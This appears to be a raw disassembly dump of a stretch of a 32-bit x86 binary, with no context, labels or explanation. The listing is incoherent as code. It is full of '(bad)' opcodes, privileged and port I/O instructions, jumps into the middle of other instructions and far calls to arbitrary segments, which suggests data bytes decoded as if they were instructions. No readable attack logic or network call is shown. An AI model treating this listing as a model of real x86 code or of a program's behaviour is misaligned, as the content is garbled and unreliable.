  41f944:	(bad)  
  41f945:	(bad)  
  41f946:	int    0x1b
  41f948:	icebp  
  41f949:	jecxz  0x41f9a4
  41f94b:	call   0x13863ec0
  41f950:	or     ebp,0x6c333897
  41f956:	fsubr  DWORD PTR [esi+0x5c569039]
  41f95c:	ret    0xdb05
  41f95f:	rol    BYTE PTR [ebx+0x6f547369],1
  41f965:	jae    0x41f93b
  41f967:	fs jmp 0x41f9c6
  41f96a:	dec    edx
  41f96b:	sbb    eax,0xd7a57257
  41f970:	adc    DWORD PTR [edx+0x15886c48],esi
  41f976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f977:	repz push cs
  41f979:	ins    BYTE PTR es:[edi],dx
  41f97a:	cmp    BYTE PTR cs:[eax+0x68],0xb4
  41f97f:	pushf  
  41f980:	mov    ch,0xe7
  41f982:	aaa    
  41f983:	repnz scas eax,DWORD PTR es:[edi]
  41f985:	in     al,dx
  41f986:	fcom   QWORD PTR [eax+0x59]
  41f989:	js     0x41f92b
  41f98b:	cwde   
  41f98c:	loope  0x41f9cc
  41f98e:	mov    bh,0x2e
  41f990:	cli    
  41f991:	imul   edi,DWORD PTR [ebx],0x25
  41f994:	in     al,dx
  41f995:	movupd XMMWORD PTR [edi-0x2205bda9],xmm7
  41f99d:	cli    
  41f99e:	pop    esi
  41f99f:	mov    ebx,0x80d836b1
  41f9a4:	sbb    cl,BYTE PTR [ebp+0x1d]
  41f9a7:	mov    bh,0xde
  41f9a9:	inc    edx
  41f9aa:	call   0xbd6:0x7009ebcf
  41f9b1:	(bad)  
  41f9b2:	mov    ch,0xbf
  41f9b4:	xchg   esp,eax
	...
  41fa15:	add    BYTE PTR [edx],cl
  41fa17:	inc    ecx
  41fa18:	mov    bh,0xa1
  41fa1a:	push   edi
  41fa1c:	push   ds
  41fa1d:	jmp    0x41f9ba
  41fa1f:	mov    eax,0x9eed8e70
  41fa24:	test   DWORD PTR [eax+0x58],ebp
  41fa27:	dec    edi
  41fa28:	add    DWORD PTR [eax],eax
  41fa2a:	pop    es
  41fa2b:	add    DWORD PTR [eax],eax
  41fa2d:	add    BYTE PTR [eax+eiz*2+0x26],dl
  41fa31:	push   0xcb7a7176
  41fa36:	cmp    al,0x6e
  41fa38:	xor    edi,DWORD PTR [eax]
  41fa3a:	call   0x4b12:0x65db3d28
  41fa41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa42:	loope  0x41fa65
  41fa44:	mov    esp,0x8446330d
  41fa49:	xchg   ebp,eax
  41fa4a:	mov    dh,0x55
  41fa4c:	sbb    eax,0x6e863ce4
  41fa51:	jmp    0x1a96695
  41fa56:	loopne 0x41fa0d
  41fa58:	lock (bad) 
  41fa5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa5b:	loope  0x41fa49
  41fa5d:	xchg   edx,eax
  41fa5e:	pop    ebp
  41fa5f:	out    0x3e,al
  41fa61:	sub    esp,DWORD PTR [edi+edx*2-0xf]
  41fa65:	fcmovbe st,st(6)
  41fa67:	mov    edi,0x1e3e67c
  41fa6c:	pop    esp
  41fa6d:	xor    ebp,esp
  41fa6f:	jg     0x41fa0a
  41fa71:	sbb    ecx,DWORD PTR [ecx]
  41fa73:	mov    al,ah
  41fa75:	inc    ecx
  41fa76:	loope  0x41fa73
  41fa78:	mov    esi,ebx
  41fa7a:	pop    es
  41fa7b:	jmp    0x41fa19
  41fa7d:	xchg   edx,eax
  41fa7e:	ss test al,0xe8
  41fa81:	jbe    0x41fa9a
  41fa83:	out    0x6,eax
  41fa85:	in     al,dx
  41fa86:	sbb    BYTE PTR [esi-0x7ff9e87],al
  41fa8c:	imul   edi,DWORD PTR [eax],0x4b00dea8
  41fa92:	mov    bl,0x11
  41fa94:	xchg   edi,eax
  41fa95:	cwde   
  41fa96:	shl    BYTE PTR [edi+0x58520044],1
  41fa9c:	mov    WORD PTR [edx+esi*2-0x7d43a833],gs
  41faa3:	not    DWORD PTR [esi+0x48bfe977]
  41faa9:	in     eax,dx
  41faaa:	adc    cl,al
  41faac:	add    DWORD PTR [esi-0x1bc39fb9],eax
  41fab2:	popf   
  41fab3:	adc    DWORD PTR [esi+ebp*4],ebx
  41fab6:	xor    eax,DWORD PTR [bp+0x5d]
  41faba:	jle    0x41faa6
  41fabc:	xchg   ecx,eax
  41fabd:	popf   
  41fabe:	mov    ds:0x329f89c6,eax
  41fac3:	add    eax,0xe5da60fc
  41fac8:	(bad)  
  41faca:	popa   
  41facb:	jge    0x41fa9a
  41facd:	mov    cl,0x9
  41facf:	jg     0x41fb1d
  41fad1:	and    dh,BYTE PTR [esi-0x449e782e]
  41fad7:	sub    al,0x1d
  41fad9:	sub    bh,BYTE PTR [esp+edx*4-0x7e]
  41fadd:	out    dx,eax
  41fade:	pusha  
  41fadf:	pop    ss
  41fae0:	clc    
  41fae1:	mov    BYTE PTR [ecx+0x747e0a69],bl
  41fae7:	and    al,0x86
  41fae9:	mov    ds:0x1276688,al
  41faee:	test   BYTE PTR [edx-0xb1162aa],0x5a
  41faf5:	cmp    al,0xef
  41faf7:	mov    ebx,0x3e159953
  41fafc:	push   ebx
  41fafd:	addr16 (bad) 
  41faff:	lods   al,BYTE PTR ds:[esi]
  41fb00:	adc    esi,DWORD PTR [esi+esi*2+0x5b909348]
  41fb07:	aaa    
  41fb08:	xor    al,0xa6
  41fb0a:	cmp    ebp,DWORD PTR [edx]
  41fb0c:	add    eax,0x5f28971d
  41fb11:	cli    
  41fb12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb13:	mov    edx,0x580bb6ae
  41fb18:	imul   ebp,DWORD PTR gs:[esp+edx*4],0xa40fb413
  41fb20:	daa    
  41fb21:	popa   
  41fb22:	(bad)  
  41fb23:	sahf   
  41fb24:	xchg   esi,eax
  41fb25:	adc    al,bh
  41fb27:	mov    dh,0x8a
  41fb29:	call   DWORD PTR [edi+esi*1+0x3700e07d]
  41fb30:	inc    ecx
  41fb31:	xchg   ebx,eax
  41fb32:	jmp    0x42ee15
	...
  41fb93:	add    BYTE PTR [eax],al
  41fb95:	add    ah,bl
  41fb97:	sub    BYTE PTR [edx-0x119011c],cl
  41fb9d:	cmp    cl,ah
  41fb9f:	cmc    
  41fba0:	push   cs
  41fba1:	adc    al,0xbc
  41fba3:	adc    BYTE PTR [esi],ch
  41fba5:	cmp    bl,BYTE PTR [edi+0x50]
  41fba8:	add    DWORD PTR [eax],eax
  41fbaa:	pop    es
  41fbab:	add    DWORD PTR [eax],eax
  41fbad:	add    BYTE PTR [edx+0x14],al
  41fbb0:	push   ebx
  41fbb1:	push   es
  41fbb2:	inc    esi
  41fbb3:	cs popa 
  41fbb5:	mov    ah,BYTE PTR [edx]
  41fbb7:	shl    DWORD PTR [edi+0x6c],1
  41fbba:	and    DWORD PTR [eax],esi
  41fbbc:	jnp    0x41fc27
  41fbbe:	or     BYTE PTR [ebp-0x4f09be27],ah
  41fbc4:	push   cs
  41fbc5:	adc    ebp,DWORD PTR [ecx]
  41fbc7:	clc    
  41fbc8:	cmp    al,0x30
  41fbca:	jecxz  0x41fb61
  41fbcc:	(bad)
  41fbcf:	jle    0x41fc16
  41fbd1:	dec    ebx
  41fbd2:	cmp    al,0xd0
  41fbd4:	xor    BYTE PTR [ecx-0x67438657],ah
  41fbda:	ficomp WORD PTR [ebx]
  41fbdc:	or     BYTE PTR [edx+0x11],dl
  41fbdf:	test   al,0xe0
  41fbe1:	fld    QWORD PTR [eax+0x15]
  41fbe4:	into   
  41fbe5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbe6:	cs das 
  41fbe8:	and    DWORD PTR [edx+0x66],ebx
  41fbeb:	pop    esp
  41fbec:	cmp    dl,cl
  41fbee:	in     eax,0x41
  41fbf0:	fwait
  41fbf1:	arpl   WORD PTR [edx+0x23],di
  41fbf4:	xchg   DWORD PTR [edx],edi
  41fbf6:	cdq    
  41fbf7:	xchg   DWORD PTR [ebx+eax*1-0x667813fb],esp
  41fbfe:	(bad)  
  41fbff:	push   edx
  41fc00:	cli    
  41fc01:	cmp    edi,DWORD PTR [ebx]
  41fc03:	jns    0x41fbe5
  41fc05:	inc    eax
  41fc06:	push   esp
  41fc07:	out    0xb8,eax
  41fc09:	arpl   cx,di
  41fc0b:	call   0xa01d8ab8
  41fc10:	int    0xd0
  41fc12:	(bad)  
  41fc13:	fcomp  QWORD PTR [ebx-0x73c2cfcc]
  41fc19:	dec    ecx
  41fc1a:	dec    edx
  41fc1b:	je     0x41fbc3
  41fc1d:	push   esp
  41fc1e:	jecxz  0x41fc51
  41fc20:	adc    DWORD PTR [eax-0x4a],0xd267683e
  41fc27:	xchg   ebp,eax
  41fc28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc29:	dec    esi
  41fc2a:	jge    0x41fbfa
  41fc2c:	int    0x36
  41fc2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc2f:	aaa    
  41fc30:	mov    bl,BYTE PTR [edi+edi*4-0x31]
  41fc34:	lea    esp,[eax-0x1f]
  41fc37:	xchg   edx,eax
  41fc38:	cmp    eax,edx
  41fc3a:	mov    ch,0xe0
  41fc3c:	sub    DWORD PTR [eax-0x70624f5],ebp
  41fc42:	and    bh,dl
  41fc44:	xor    bl,BYTE PTR [ebx+0x314ecd86]
  41fc4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc4b:	aad    0xe7
  41fc4d:	in     al,dx
  41fc4e:	std    
  41fc4f:	rol    DWORD PTR [eax-0x683c377e],1
  41fc55:	xchg   BYTE PTR [edi],cl
  41fc57:	pop    ecx
  41fc58:	inc    ebx
  41fc59:	mov    ds:0xfb9ea0bf,al
  41fc5e:	pop    ecx
  41fc5f:	mov    ebx,0x3deb11cd
  41fc64:	inc    eax
  41fc65:	or     al,0x73
  41fc67:	xor    eax,0x587d1a96
  41fc6c:	fs jnp 0x41fcb8
  41fc6f:	xchg   esi,eax
  41fc70:	or     eax,0x616f3a86
  41fc75:	add    BYTE PTR [ecx+0x5382b12],cl
  41fc7b:	jae    0x41fcf5
  41fc7d:	mov    ds:0xcfb07eb,al
  41fc82:	clc    
  41fc83:	add    ch,cl
  41fc85:	adc    eax,0x6d6a4ef0
  41fc8a:	sub    DWORD PTR [esi],edx
  41fc8c:	and    esi,DWORD PTR [edi-0x3e]
  41fc8f:	std    
  41fc90:	add    al,0xe1
  41fc92:	dec    esp
  41fc93:	adc    ah,ah
  41fc95:	and    eax,0xb009d1a4
  41fc9a:	ja     0x41fc82
  41fc9c:	jne    0x41fc49
  41fc9e:	or     esi,DWORD PTR [edi-0x58]
  41fca1:	mov    al,0x37
  41fca3:	lds    ecx,FWORD PTR [edx-0x22]
  41fca6:	loop   0x41fc44
  41fca8:	push   0x587740ec
  41fcad:	in     al,dx
  41fcae:	(bad)  
  41fcaf:	icebp  
  41fcb0:	shl    ch,0x77
  41fcb3:	and    al,0x33
	...
  41fd15:	add    BYTE PTR [edx+ebp*2],cl
  41fd18:	push   edx
  41fd19:	shl    DWORD PTR [esi-0x7],0x9f
  41fd1d:	out    dx,eax
  41fd1e:	je     0x41fd3b
  41fd20:	pop    ebp
  41fd21:	inc    edi
  41fd22:	(bad)  
  41fd23:	lahf   
  41fd24:	or     eax,0x15166f4
  41fd29:	add    BYTE PTR [edi],al
  41fd2b:	add    DWORD PTR [eax],eax
  41fd2d:	add    BYTE PTR [edx],ch
  41fd2f:	retf   0xe997
  41fd32:	pop    edi
  41fd33:	out    0x48,al
  41fd35:	mov    eax,ds:0xe4891d49
  41fd3a:	and    BYTE PTR [edi+ecx*2+0x2bc3a3f2],dh
  41fd41:	mov    edx,0x23f61d44
  41fd46:	add    al,0xbc
  41fd48:	adc    DWORD PTR [ecx],esi
  41fd4a:	push   ds
  41fd4b:	outs   dx,BYTE PTR ds:[esi]
  41fd4c:	or     al,dl
  41fd4e:	xchg   edx,eax
  41fd4f:	push   0x7b
  41fd51:	mov    edx,DWORD PTR [ebp+ebp*4-0x8e82abb]
  41fd58:	mov    ?,WORD PTR [edi-0x71]
  41fd5b:	ds inc ebx
  41fd5d:	daa    
  41fd5e:	xchg   DWORD PTR [edi],ecx
  41fd60:	sub    edx,DWORD PTR [edx+0x275dbdec]
  41fd66:	sbb    eax,esi
  41fd68:	iret   
  41fd69:	js     0x41fd34
  41fd6b:	push   esp
  41fd6c:	jmp    0xaf5a1602
  41fd71:	(bad)  [edi+0xd]
  41fd74:	push   eax
  41fd75:	push   esp
  41fd76:	push   ebp
  41fd77:	add    al,0xbc
  41fd79:	push   esp
  41fd7a:	dec    edx
  41fd7b:	lods   eax,DWORD PTR ds:[esi]
  41fd7c:	ds jl  0x41fd5d
  41fd7f:	ds in  al,dx
  41fd81:	iret   
  41fd82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd83:	or     ebx,DWORD PTR [esi+ebx*1-0x75]
  41fd87:	in     al,dx
  41fd88:	(bad)  
  41fd89:	repz stc 
  41fd8b:	cmp    BYTE PTR [edx-0x15],0xd6
  41fd8f:	jecxz  0x41fd30
  41fd91:	jge    0x41fd60
  41fd93:	(bad)  
  41fd94:	es ja  0x41fd66
  41fd97:	xchg   esp,eax
  41fd98:	xchg   edx,eax
  41fd99:	or     esi,DWORD PTR [ebx+0x69]
  41fd9c:	or     BYTE PTR [edx+0x6],0x32
  41fda0:	loopne 0x41fd4a
  41fda2:	mov    esi,0x7b8dba4e
  41fda7:	fadd   QWORD PTR [edx]
  41fda9:	jb     0x41fddf
  41fdab:	mov    eax,ds:0x9016d92d
  41fdb0:	popf   
  41fdb1:	rcl    BYTE PTR [edi],0x89
  41fdb4:	push   cs
  41fdb5:	jae    0x41fd83
  41fdb7:	dec    esp
  41fdb8:	push   ecx
  41fdb9:	sbb    DWORD PTR [edi+0x460e9f2d],edx
  41fdbf:	push   ecx
  41fdc0:	rcl    DWORD PTR [edx],cl
  41fdc2:	sbb    DWORD PTR [ebp+0x5b1e6a75],0xffffff80
  41fdc9:	jge    0x41fd98
  41fdcb:	js     0x41fd76
  41fdcd:	cmp    al,0x82
  41fdcf:	and    eax,0x2e2e652b
  41fdd4:	aad    0x6
  41fdd6:	mov    ds:0x84b94e3e,eax
  41fddb:	outs   dx,DWORD PTR ds:[esi]
  41fddc:	inc    esp
  41fddd:	mov    eax,0xf5557f69
  41fde2:	xchg   BYTE PTR [eax],ah
  41fde4:	je     0x41fdc2
  41fde6:	push   ecx
  41fde7:	jns    0x41fdb4
  41fde9:	test   DWORD PTR [eax-0x36],eax
  41fdec:	adc    BYTE PTR [esi],ah
  41fdee:	pusha  
  41fdef:	and    al,cl
  41fdf1:	mov    ah,0xe
  41fdf3:	adc    bl,al
  41fdf5:	fcom   QWORD PTR [eax-0x75]
  41fdf8:	je     0x41fe6c
  41fdfa:	sahf   
  41fdfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdfc:	cmp    cl,BYTE PTR [edi+0xca1c860]
  41fe02:	jmp    FWORD PTR [ecx+0xca00b6c]
  41fe08:	fwait
  41fe09:	rol    DWORD PTR [ecx],0x22
  41fe0c:	lds    ecx,FWORD PTR [ebx-0x1]
  41fe0f:	fdivr  st,st(6)
  41fe11:	mov    esi,0x7c1ef892
  41fe16:	data16 daa 
  41fe18:	mov    ah,0x8a
  41fe1a:	pop    es
  41fe1b:	xor    eax,0x14abd4e9
  41fe20:	into   
  41fe21:	xor    BYTE PTR [edx+eiz*2],dl
  41fe24:	and    al,0x2b
  41fe26:	push   edx
  41fe27:	pushf  
  41fe28:	out    0x1d,eax
  41fe2a:	repnz pop ebp
  41fe2c:	retf   
  41fe2d:	(bad)  
  41fe2e:	fist   DWORD PTR [edi+0x6d]
  41fe31:	outs   dx,DWORD PTR ds:[esi]
  41fe32:	leave  
  41fe33:	jp     0x41fe21
	...
  41fe95:	add    BYTE PTR [edx-0x1865ab],ch
  41fe9b:	out    dx,eax
  41fe9c:	call   FWORD PTR [ebp+0x51]
  41fe9f:	lock xor DWORD PTR [edi-0x1a],0x1b
  41fea4:	pop    ebp
  41fea5:	cld    
  41fea6:	ins    DWORD PTR es:[edi],dx
  41fea7:	push   edx
  41fea8:	add    DWORD PTR [eax],eax
  41feaa:	pop    es
  41feab:	add    DWORD PTR [eax],eax
  41fead:	add    bh,ch
  41feaf:	mov    ds:0x845ce090,eax
  41feb4:	test   eax,0x9912ce26
  41feb9:	add    eax,0x88c75b9b
  41febe:	pop    ds
  41febf:	mov    dl,0x9f
  41fec1:	fcomp  DWORD PTR [edi+0xd]
  41fec4:	out    dx,al
  41fec5:	pop    esp
  41fec6:	je     0x41fe69
  41fec8:	aaa    
  41fec9:	push   es
  41feca:	xchg   BYTE PTR [edx],dh
  41fecc:	xchg   dl,al
  41fece:	fs out dx,eax
  41fed0:	inc    eax
  41fed1:	fucomp st(1)
  41fed3:	ss xchg esp,eax
  41fed5:	iret   
  41fed6:	lods   eax,DWORD PTR ds:[esi]
  41fed7:	xchg   esi,eax
  41fed8:	push   cs
  41fed9:	and    ah,BYTE PTR [edx]
  41fedb:	fldpi  
  41fedd:	cld    
  41fede:	mov    DWORD PTR [ecx-0x5330cbbd],0xf99990bc
  41fee8:	enter  0x821b,0xa3
  41feec:	nop
  41feed:	adc    BYTE PTR [ebx],bl
  41feef:	xchg   ebp,eax
  41fef0:	je     0x41ff10
  41fef2:	push   edx
  41fef3:	or     edi,DWORD PTR [esi+esi*2]
  41fef6:	dec    esp
  41fef7:	and    eax,0x4501183c
  41fefc:	std    
  41fefd:	js     0x41feb8
  41feff:	aad    0x5c
  41ff01:	cmp    dh,BYTE PTR es:[edi+edi*8-0x50044d23]
  41ff09:	test   eax,0x3bac01c1
  41ff0e:	or     BYTE PTR [eax-0x750e2c90],dh
  41ff14:	mov    BYTE PTR [edi+0x7f1cbd78],cl
  41ff1a:	and    eax,0xfb1e0
  41ff1f:	repz add eax,0xf3266743
  41ff25:	push   edx
  41ff26:	inc    edx
  41ff27:	inc    ebp
  41ff28:	fisttp DWORD PTR [edi+0x1f]
  41ff2b:	jmp    0x5fec:0xb916c553
  41ff32:	jae    0x41ff7f
  41ff34:	ret    
  41ff35:	mov    cl,0x94
  41ff37:	add    DWORD PTR [ebp+0x21],edx
  41ff3a:	jo     0x41ff57
  41ff3c:	inc    ecx
  41ff3d:	fisttp DWORD PTR [ebp-0x31]
  41ff40:	sbb    DWORD PTR [esi],0xbe8c45c3
  41ff46:	rcl    DWORD PTR [edx-0x509f6b3a],0xf0
  41ff4d:	(bad)  
  41ff4e:	and    BYTE PTR [edx-0x80],bl
  41ff51:	inc    esi
  41ff52:	iret   
  41ff53:	mov    ds,WORD PTR [ebp-0x7de48b54]
  41ff59:	cmp    al,BYTE PTR [ecx-0x586927ac]
  41ff5f:	test   eax,0x2e0d4474
  41ff64:	xchg   ebx,eax
  41ff65:	jbe    0x41ff2c
  41ff67:	ja     0x41ff88
  41ff69:	dec    ebx
  41ff6a:	(bad)  
  41ff6b:	call   0x1974:0xfb7d49de
  41ff72:	fidivr WORD PTR [ecx+0xe]
  41ff75:	test   DWORD PTR [edx+0x65cf14a9],0xc64ba112
  41ff7f:	cmc    
  41ff80:	jge    0x41ff60
  41ff82:	js     0x41ff91
  41ff84:	xchg   ecx,eax
  41ff85:	xchg   esp,edx
  41ff87:	addr16 ret 
  41ff89:	xor    eax,0x85329efe
  41ff8e:	cmp    eax,ecx
  41ff90:	push   ecx
  41ff91:	pop    ss
  41ff92:	lea    edi,[ebp+0x205878e]
  41ff98:	push   0x5e89ffbd
  41ff9d:	aaa    
  41ff9e:	xchg   esi,eax
  41ff9f:	out    0x83,al
  41ffa1:	and    DWORD PTR ds:0xbad8287f,ebx
  41ffa7:	(bad)  
  41ffa8:	jmp    0xbd7bf692
  41ffad:	dec    edx
  41ffae:	outs   dx,DWORD PTR ds:[esi]
  41ffaf:	and    DWORD PTR es:[esi-0x79],eax
  41ffb3:	xlat   BYTE PTR ds:[ebx]
  41ffb4:	sbb    al,0x0
	...
  420016:	bound  esp,QWORD PTR [ebp-0x8808a]
  42001c:	imul   edi,DWORD PTR [ebp-0x2ab923c6],0xffffffe5
  420023:	retf   0xc1f7
  420026:	je     0x42007b
  420028:	add    DWORD PTR [eax],eax
  42002a:	pop    es
  42002b:	add    DWORD PTR [eax],eax
  42002d:	add    dh,ah
  42002f:	nop
  420030:	xor    al,0x24
  420032:	sub    DWORD PTR [ecx],esp
  420034:	jo     0x41ffcd
  420036:	push   0x7c
  420038:	in     al,0xfc
  42003a:	js     0x420026
  42003c:	outs   dx,BYTE PTR ds:[esi]
  42003d:	sub    DWORD PTR [ebp+0x55],esi
  420040:	sub    DWORD PTR [esi+0x1327fdaf],esp
  420046:	(bad)
  42004a:	out    0xe5,eax
  42004c:	lock mov edi,0x553d63a4
  420052:	inc    ebp
  420053:	(bad)  
  420054:	pop    ecx
  420055:	cmp    esp,DWORD PTR [edi+esi*1]
  420058:	sbb    DWORD PTR [edx+0x501a40f2],edx
  42005e:	sub    al,0x9c
  420060:	loop   0x420034
  420062:	popf   
  420063:	neg    DWORD PTR [ebp+0x29e95bde]
  420069:	mov    BYTE PTR [esp+edi*2+0x66],cl
  42006d:	loope  0x420067
  42006f:	fwait
  420070:	lea    eax,[ebp-0x42c066af]
  420076:	jns    0x42000f
  420078:	out    dx,eax
  420079:	sar    DWORD PTR [eax+0x3d],0xa
  42007d:	stc    
  42007e:	mov    esp,0x10058be1
  420083:	add    esp,DWORD PTR [esi+eiz*8-0x6106f2ec]
  42008a:	sbb    eax,0x423556f3
  42008f:	mov    ch,0xea
  420091:	repz xchg esi,eax
  420093:	or     edi,DWORD PTR [eax+0x14]
  420096:	or     dh,0x9
  420099:	xchg   edx,eax
  42009a:	xor    cl,dh
  42009c:	sbb    BYTE PTR [eax-0x5c],dl
  42009f:	ja     0x420093
  4200a1:	or     edx,eax
  4200a3:	xchg   edi,eax
  4200a4:	jno    0x420125
  4200a6:	xchg   ebp,eax
  4200a7:	inc    edx
  4200a8:	sahf   
  4200a9:	mov    WORD PTR [ebp-0x16],?
  4200ac:	inc    ebx
  4200ad:	mov    cl,0x2f
  4200af:	sub    edx,DWORD PTR [esi+0x4e]
  4200b2:	push   0x80d10e64
  4200b7:	ror    DWORD PTR [ecx-0x7],cl
  4200ba:	inc    esp
  4200bb:	(bad)  [eax]
  4200bd:	jbe    0x420072
  4200bf:	icebp  
  4200c0:	xor    al,0x26
  4200c2:	enter  0x8884,0xfb
  4200c6:	in     eax,dx
  4200c7:	xchg   ecx,eax
  4200c8:	add    eax,0x2600a095
  4200cd:	sbb    bh,cl
  4200cf:	je     0x42014a
  4200d1:	dec    esi
  4200d2:	adc    DWORD PTR [edx],edx
  4200d4:	inc    ecx
  4200d5:	ret    0xd4b3
  4200d8:	add    ecx,DWORD PTR [ebx+0x23]
  4200db:	ds stc 
  4200dd:	ret    
  4200de:	cli    
  4200df:	test   DWORD PTR [edx+esi*8+0x3d76e2be],ebx
  4200e6:	stc    
  4200e7:	icebp  
  4200e8:	fnstcw WORD PTR [ecx]
  4200ea:	cmp    al,0x6a
  4200ec:	sbb    eax,0x445fffb8
  4200f1:	aam    0x10
  4200f3:	xchg   ebx,eax
  4200f4:	sbb    ebp,DWORD PTR [ebx+ebp*1+0x27dc48c5]
  4200fb:	jb     0x4200c6
  4200fd:	retf   0x7abe
  420100:	jmp    0x4200f0
  420102:	aam    0x87
  420104:	aas    
  420105:	jg     0x420177
  420107:	repz mov esp,0xbb305b2f
  42010d:	adc    eax,0x352a492c
  420112:	mov    bh,0x86
  420114:	into   
  420115:	pop    edi
  420116:	cmp    al,0x18
  420118:	mov    es,WORD PTR [edi-0x2581ab9d]
  42011e:	fld    QWORD PTR [edi+edx*4+0x2470d235]
  420125:	aas    
  420126:	and    esp,ebp
  420128:	das    
  420129:	fsubr  QWORD PTR [ebx-0x113ea28f]
  42012f:	mov    BYTE PTR [edi+0x1],cl
  420132:	mov    al,ds:0x7409
	...
  420193:	add    BYTE PTR [eax],al
  420195:	add    BYTE PTR [ebx-0x31],dh
  420198:	fwait
  420199:	cmp    DWORD PTR [edi+0x5dcff37d],edi
  42019f:	xchg   ebp,eax
  4201a0:	xchg   ebx,eax
  4201a1:	dec    edi
  4201a2:	repz push edi
  4201a4:	ror    BYTE PTR [ebp+0x7b],0x54
  4201a8:	add    DWORD PTR [eax],eax
  4201aa:	pop    es
  4201ab:	add    DWORD PTR [eax],eax
  4201ad:	add    BYTE PTR [ebp+0x59],cl
  4201b0:	cs jl  0x4201db
  4201b3:	mov    cl,0xfc
  4201b5:	push   ss
  4201b6:	test   eax,0x729715de
  4201bb:	jge    0x42022c
  4201bd:	mov    edx,DWORD PTR [ecx]
  4201bf:	add    DWORD PTR [ecx-0x3e739cd0],ebp
  4201c5:	pop    esp
  4201c6:	inc    ebx
  4201c7:	loopne 0x4201e0
  4201c9:	lods   eax,DWORD PTR ds:[esi]
  4201ca:	mov    al,ds:0x8b504bac
  4201cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201d0:	pop    ss
  4201d1:	xchg   BYTE PTR [edx+edx*2+0x32a24ab5],cl
  4201d8:	adc    DWORD PTR [eax+edi*4],ecx
  4201db:	mov    ebx,0xaecdf717
  4201e0:	xor    al,0xb1
  4201e2:	sub    DWORD PTR [eax-0x2667bb1e],edi
  4201e8:	xor    edx,edi
  4201ea:	inc    edi
  4201eb:	or     dh,dh
  4201ed:	push   edx
  4201ee:	sbb    ebx,DWORD PTR [ebp-0x10e4bfa7]
  4201f4:	mov    ebx,0x9190c451
  4201f9:	mov    ch,0x61
  4201fb:	xchg   ebx,eax
  4201fc:	push   0xef577f6d
  420201:	push   0x20
  420203:	sub    eax,0x6db4272d
  420208:	in     eax,dx
  420209:	pop    esi
  42020a:	into   
  42020b:	add    dl,bh
  42020d:	cld    
  42020e:	push   ebp
  42020f:	enter  0xaa6d,0x46
  420213:	scas   al,BYTE PTR es:[edi]
  420214:	dec    eax
  420215:	push   0xffffff81
  420217:	adc    eax,DWORD PTR [ecx+eiz*2]
  42021a:	dec    ebp
  42021b:	pop    ebp
  42021c:	test   al,0xf5
  42021e:	sub    edx,esi
  420220:	push   ss
  420221:	fld    DWORD PTR [edi]
  420223:	js     0x42021f
  420225:	xchg   ecx,eax
  420226:	adc    al,0x18
  420228:	or     edx,edx
  42022a:	pusha  
  42022b:	loop   0x420250
  42022d:	mov    bl,BYTE PTR [esi-0x4ccdac37]
  420233:	inc    ecx
  420234:	inc    edx
  420235:	jmp    0x8466:0x504d86df
  42023c:	(bad)  
  42023d:	fld    QWORD PTR [edi+ebx*1]
  420240:	sbb    edx,DWORD PTR [edi+0xc]
  420243:	adc    BYTE PTR [eax+edi*2-0x59069c4a],dh
  42024a:	mov    esi,0xd5818d17
  42024f:	loope  0x4202c6
  420251:	(bad)  
  420252:	ins    BYTE PTR es:[edi],dx
  420253:	sub    bl,bl
  420255:	or     bl,BYTE PTR [edi-0x73cb5e11]
  42025b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42025c:	inc    ebx
  42025d:	js     0x420298
  42025f:	stos   BYTE PTR es:[edi],al
  420260:	push   eax
  420261:	retf   0x5ea7
  420264:	push   0xffffff9c
  420266:	jl     0x42028f
  420268:	xchg   esi,eax
  420269:	dec    esp
  42026a:	mov    ?,WORD PTR [edx+0x281de42f]
  420270:	pusha  
  420271:	push   ebx
  420272:	inc    ecx
  420273:	outs   dx,BYTE PTR ds:[esi]
  420274:	add    esp,DWORD PTR [edx-0x481c592]
  42027a:	sub    DWORD PTR [edx],ebp
  42027c:	push   cs
  42027d:	inc    esp
  42027e:	xor    ebp,DWORD PTR [edx-0x2e]
  420281:	xchg   edx,eax
  420282:	adc    eax,0x97c54732
  420287:	daa    
  420288:	xchg   DWORD PTR [eax+0x204cb48c],eax
  42028e:	ins    BYTE PTR es:[edi],dx
  42028f:	xchg   edi,eax
  420290:	imul   edx,DWORD PTR [ecx+0xa],0x5f
  420294:	dec    ebx
  420295:	or     BYTE PTR [edx+edi*1-0x48],0x43
  42029a:	mov    eax,ds:0x920e8a4a
  42029f:	mov    eax,ds:0x78e42716
  4202a4:	test   DWORD PTR ds:0xe9b79d15,esi
  4202aa:	inc    esp
  4202ab:	imul   ebp,DWORD PTR [ebx-0x3d],0x4cd6089b
  4202b2:	jae    0x42028d
  4202b4:	fiadd  WORD PTR [eax]
	...
  420316:	inc    ecx
  420317:	push   es
  420318:	clc    
  420319:	mov    esi,0xff47feff
  42031e:	mov    cl,0x27
  420320:	pop    ebx
  420321:	fcomip st,st(4)
  420323:	idiv   DWORD PTR [esi+0x13]
  420326:	adc    BYTE PTR [ebp+0x1],0x0
  42032a:	pop    es
  42032b:	add    DWORD PTR [eax],eax
  42032d:	add    BYTE PTR [ebp+edi*4+0x47],dl
  420331:	in     al,dx
  420332:	shl    DWORD PTR [ebx-0x5],1
  420335:	cmp    al,BYTE PTR ds:0xfee9fbd
  42033b:	push   ebp
  42033c:	inc    esp
  42033d:	fsub   st,st(3)
  42033f:	or     eax,0x3233e7eb
  420344:	jns    0x420308
  420346:	inc    DWORD PTR [ebx-0x944f37a]
  42034c:	(bad)  
  42034d:	dec    ebx
  42034e:	mov    ss,WORD PTR [ecx+0x7409dff6]
  420354:	xchg   ebx,eax
  420355:	aas    
  420356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420357:	push   0xb24f7ccf
  42035c:	pop    edx
  42035d:	push   ds
  42035e:	test   eax,0xa2fbd4c9
  420363:	xchg   esp,eax
  420364:	in     al,dx
